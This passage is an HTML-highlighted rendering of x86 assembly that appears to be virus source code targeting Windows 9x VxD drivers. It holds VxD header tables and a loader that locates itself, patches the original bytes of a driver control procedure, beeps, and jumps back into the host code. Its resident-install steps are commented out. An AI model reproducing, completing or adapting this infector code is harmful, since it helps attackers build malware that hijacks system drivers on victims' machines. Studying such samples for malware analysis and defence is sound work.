</span><span class="sc5">oe_relocation_base_address</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">oe_flags</span><span class="sc0">                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">oe_page_map_index</span><span class="sc0">                       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">oe_page_map_entries</span><span class="sc0">                     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">oe_reserved</span><span class="sc0">                             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc9">ends</span><span class="sc0">

                        </span><span class="sc1">; vxd`s object table</span><span class="sc0">
</span><span class="sc5">max_objs</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">32</span><span class="sc0">
</span><span class="sc5">ot</span><span class="sc0">                      </span><span class="sc5">oe_struc</span><span class="sc0">   </span><span class="sc5">max_objs</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">max_ot_size</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">        </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">ot</span><span class="sc0">

                        </span><span class="sc1">; page-map table</span><span class="sc0">
</span><span class="sc5">max_pages</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">64</span><span class="sc0">
</span><span class="sc5">pmt</span><span class="sc0">                     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">max_pages</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">max_pmt_size</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">pmt</span><span class="sc0">

                        </span><span class="sc1">; entry-table (really its not a table)</span><span class="sc0">
</span><span class="sc5">max_et_size</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">256</span><span class="sc0">
</span><span class="sc5">et</span><span class="sc0">                      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">max_et_size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

                        </span><span class="sc1">; DDBEntry structure</span><span class="sc0">
</span><span class="sc5">max_ddb_size</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">64</span><span class="sc0">
</span><span class="sc5">ddb</span><span class="sc0">                     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">max_ddb_size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

                        </span><span class="sc1">; control_proc_x we`re patching</span><span class="sc0">
</span><span class="sc5">max_cp_size</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">256</span><span class="sc0">
</span><span class="sc5">cp</span><span class="sc0">                      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">max_cp_size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

                        </span><span class="sc9">align</span><span class="sc0">   </span><span class="sc2">16</span><span class="sc0">      </span><span class="sc1">; important!</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0">                    </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">ldr</span><span class="sc0">                     </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0">     </span><span class="sc1">; 32-bit VxD-loader</span><span class="sc0">
                        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ldr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">ldr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">ldr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">ldr</span><span class="sc0">

</span><span class="sc5">ldr_start</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">ldr_entry</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; &lt;- important</span><span class="sc0">
                        </span><span class="sc6">pushad</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">entry</span><span class="sc0">   </span><span class="sc1">; where am i?</span><span class="sc0">
</span><span class="sc5">entry</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">entry</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ldr_start</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">12345678h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; make EAX points to</span><span class="sc0">
</span><span class="sc5">save_0</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">         </span><span class="sc1">; section beginning</span><span class="sc0">

                        </span><span class="sc1">; restore original bytes</span><span class="sc0">

                        </span><span class="sc1">; can anybody explain it?</span><span class="sc0">
                        </span><span class="sc1">; section attributes was exec+readonly, i.e.</span><span class="sc0">
                        </span><span class="sc1">; not writeable, but following patch works</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0">  </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12345678h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">
</span><span class="sc5">save_1</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">save_2</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0">  </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12345678h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">save_3</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">save_4</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">beep</span><span class="sc0">

</span><span class="sc1">;                       ; now control_proc_x restored, and we can</span><span class="sc0">
</span><span class="sc1">;                       ; go resident</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                       ; alloocate some memory</span><span class="sc0">
</span><span class="sc1">;                       push    PAGEFIXED + PAGEZEROINIT  ; flags</span><span class="sc0">
</span><span class="sc1">;                       push    0        ; PhysAddr      @dword, unused</span><span class="sc0">
</span><span class="sc1">;                       push    0        ; maxPhys       max page #, unused</span><span class="sc0">
</span><span class="sc1">;                       push    0        ; minPhys       min page #, unused</span><span class="sc0">
</span><span class="sc1">;                       push    0Fh      ; ALignMask     64k-aligned</span><span class="sc0">
</span><span class="sc1">;                       push    0        ; VM            0 if pType=PG_SYS</span><span class="sc0">
</span><span class="sc1">;                       push    PG_SYS   ; pType         alloc in sys area</span><span class="sc0">
</span><span class="sc1">;                       push    vxd_pages; nPages        page count</span><span class="sc0">
</span><span class="sc1">;                       VMMcall PageAllocate</span><span class="sc0">
</span><span class="sc1">;                       add     esp, 4*8</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                       mov     ecx, eax</span><span class="sc0">
</span><span class="sc1">;                       or      ecx, edx</span><span class="sc0">
</span><span class="sc1">;                       jz      __error</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                     ; mov     pagehandle[ebp], eax</span><span class="sc0">
</span><span class="sc1">;                     ; mov     pageaddress[ebp], edx</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                       mov     edi, edx   ; edi = our address</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                       int 3</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                       lea     edx, ldr_vxd_name[ebp]</span><span class="sc0">
</span><span class="sc1">;                       VMMcall OpenFile</span><span class="sc0">
</span><span class="sc1">;                       jc      __error</span><span class="sc0">
</span><span class="sc1">;                       xchg    ebx, eax</span><span class="sc0">

</span><span class="sc5">__error</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">popad</span><span class="sc0">
                        </span><span class="sc6">popf</span><span class="sc0">

                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc0">
</span><span class="sc5">save_5</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">12345678h</span><span class="sc0">

</span><span class="sc5">beep</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B6h</span><span class="sc0">
                        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">123456h</span><span class="sc4">/</span><span class="sc2">3300</span><span class="sc0">    </span><span class="sc1">; 3300 Hz</span><span class="sc0">
                        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
                        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

                        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">61h</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3000000</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">nop</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__1</span><span class="sc0">

                        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">61h</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ldr_vxd_name            db      128 dup ('?')</span><span class="sc0">

</span><span class="sc5">ldr_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ldr_size</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">ldr_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ldr_start</span><span class="sc0">

                        </span><span class="sc9">align</span><span class="sc0">   </span><span class="sc2">16</span><span class="sc0">      </span><span class="sc1">; important!</span><span class="sc0">
</span><span class="sc5">ldr</span><span class="sc0">                     </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;vxd                     segment word use32     ; 32-bit VxD-handler</span><span class="sc0">
</span><span class="sc1">;                        assume  cs:vxd, ds:vxd, es:vxd, ss:vxd</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;vxd_start:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                        nop</span><span class="sc0">
</span><span class="sc1">;                        nop</span><span class="sc0">
</span><span class="sc1">;                        nop</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;vxd_end:</span><span class="sc0">
</span><span class="sc1">;vxd_size                equ     vxd_end - vxd_start</span><span class="sc0">
</span><span class="sc1">;vxd_pages               equ     (vxd_size + 4095) / 4096</span><span class="sc0">
</span><span class="sc1">;vxd                     ends</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
                         </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">



</span></div></body>
</html>
